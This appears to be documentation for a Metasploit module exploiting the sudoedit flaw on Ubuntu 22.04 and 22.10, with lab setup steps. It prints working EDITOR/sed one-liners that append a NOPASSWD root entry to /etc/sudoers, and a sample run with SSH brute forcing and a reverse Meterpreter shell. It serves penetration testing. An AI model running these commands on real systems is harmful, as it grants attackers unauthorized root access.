## Vulnerable Application

This exploit takes advantage of a vulnerability in sudoedit, part of the sudo package.
The sudoedit (aka sudo -e) feature mishandles extra arguments passed in the user-provided
environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to
append arbitrary entries to the list of files to process. This can lead to privilege escalation.
by appending extra entries on /etc/sudoers allowing for execution of an arbitrary payload with root
privileges.

Affected versions are 1.8.0 through 1.9.12.p1. However THIS module only works against Ubuntu
22.04 and 22.10.

This module was tested against sudo 1.9.9-1ubuntu2 on Ubuntu 22.04, and
1.9.11p3-1ubuntu1 on Ubuntu 22.10.

### Exploit Breakdown

This exploit works by first identifying what file can be edited via `sudo -l`.  The `-S` flag
is also required or sudo may complain about not being in a proper tty environment, so `-S` specifies
to allow password input via stdin (although we never provide a password).

Next we make a new entry in `/etc/sudoers`.  In theory we could specify something similar to `"$USER ALL=(ALL:ALL) ALL"`
which many of the PoCs do, however we can be more surgical.  In this case, we don't specify the payload as most
Metasploit exploits would, but actually a shell (`/bin/sh` by default), as `sudo` doesn't play well with `&`.
We also add a flag at the end of our entry after a `#` (comment) for ease of erasing later.

Next we execute out payload, launching it through our shell.

Many of the PoCs work via user input where you have to manually edit `/etc/sudoers`. Obviously this strategy
won't work with Metasploit, as we need to automate it. Early attempts tried to script `vi` into performing
the write and quite command, similar to:
```EDITOR="vi -c ':$' -c ':s/$/\\r`whoami` ALL=(ALL:ALL) ALL/' -c ':wq'  -c ':q' -- /etc/sudoers" sudo -e /etc/motd```
However, the command didn't do well with newlines and escaping.

`sed` however is a valid editor, so it was relatively trivial to script out adding the new entry via sed:
```EDITOR="sed -i -e '$ a `whoami` ALL=(ALL:ALL) NOPASSWD: ALL' -- /etc/sudoers" sudo -e /etc/motd```

#### Results from other OSes

Most of the errors are similar to:

```
[*] Executing command: EDITOR="sed -i -e '$ a `whoami` ALL=(ALL:ALL) NOPASSWD: /bin/sh # 2Iq0tUAqsqtn' -- /etc/sudoers" sudo -S -e /etc/motd
[*] sudo: --: editing files in a writable directory is not permitted
[*] sed: -e expression #1, char 1: unknown command: `''
```

### Install

#### On Ubuntu 22.10:

```
https://mirrors.wikimedia.org/ubuntu/ubuntu/pool/main/s/sudo/sudo_1.9.11p3-1ubuntu1_amd64.deb
sudo dpkg -i sudo_1.9.11p3-1ubuntu1_amd64.deb
```

Follow the 22.04 instructions, after installing the deb package, to configure the host.

#### On Ubuntu 22.04:

```
wget http://security.ubuntu.com/ubuntu/pool/main/s/sudo/sudo_1.9.9-1ubuntu2_amd64.deb
sudo dpkg -i sudo_1.9.9-1ubuntu2_amd64.deb
```

Now add an entry to `/etc/sudoers` for an editable file, in this case we use `/etc/motd`.
Change 'user' for whatever user you want to be able to exploit this:

```
user ALL=(root) NOPASSWD: sudoedit /etc/motd
```

Now test this by running `sudo -l` and you should see:

```
User <user> may run the following commands on <system>:
    (ALL : ALL) ALL
    (root) NOPASSWD: sudoedit /etc/motd
```

Noting the entry at the bottom to `/etc/motd`

## Verification Steps

1. Install the application
2. Get an initial shell
3. Do: `use exploit/linux/local/sudoedit_bypass_priv_esc`
4. Do: `set session [session]`
5. Do: `run`
6. You should get a root shell.

## Options

### EDITABLEFILE

The file which can be edited via `sudoedit`. An attempt to auto detect this is made, so it is only required
if auto detection fails.

### SHELL

Which shell to use. Defaults to `/bin/sh`

### TIMEOUT

The amount of time to wait for a `sudo` command to respond. Defaults to `5`.


## Scenarios

### Sudo 1.9.9-1ubuntu2 on Ubuntu 22.04

```
[*] Processing sudoedit.rb for ERB directives.
resource (sudoedit.rb)> use auxiliary/scanner/ssh/ssh_login
resource (sudoedit.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (sudoedit.rb)> set username ubuntu
username => ubuntu
resource (sudoedit.rb)> set password ubuntu
password => ubuntu
resource (sudoedit.rb)> run
[*] 1.1.1.1:22 - Starting bruteforce
[+] 1.1.1.1:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd) Linux ubuntu2204 5.15.0-48-generic #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (2.2.2.2:46613 -> 1.1.1.1:22) at 2023-04-25 18:46:03 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (sudoedit.rb)> use exploit/linux/local/sudoedit_bypass_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
resource (sudoedit.rb)> set session 1
session => 1
resource (sudoedit.rb)> set verbose true
verbose => true
resource (sudoedit.rb)> exploit
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: 
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] sudo version 1.9.9.pre.1ubuntu2 is vulnerable
[+] The target is vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, can edit: /etc/motd
[*] Writing '/tmp/.LImVy' (250 bytes) ...
[*] Max line length is 65537
[*] Writing 250 bytes in 1 chunks of 735 bytes (octal-encoded), using printf
[*] Adding user to sudoers
[*] Executing command: EDITOR="sed -i -e '$ a `whoami` ALL=(ALL:ALL) NOPASSWD: /bin/sh # SbccIOwAiK1i' -- /etc/sudoers" sudo -S -e /etc/motd
[+] Likely successful exploitation, detected positive error message: editing files in a writable directory is not permitted
[*] sudo: --: editing files in a writable directory is not permitted
[*] Spawning payload
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 1.1.1.1
[-] Manual cleanup is likely required, please run: sed -i '/# SbccIOwAiK1i/d' /etc/sudoers
[*] Meterpreter session 2 opened (2.2.2.2:4444 -> 1.1.1.1:57426) at 2023-04-25 18:46:25 -0400

(Meterpreter 2)(/home/ubuntu) > getuid
Server username: root
(Meterpreter 2)(/home/ubuntu) > sysinfo
Computer     : 1.1.1.1
OS           : Ubuntu 22.04 (Linux 5.15.0-48-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
(Meterpreter 2)(/home/ubuntu) > 
```
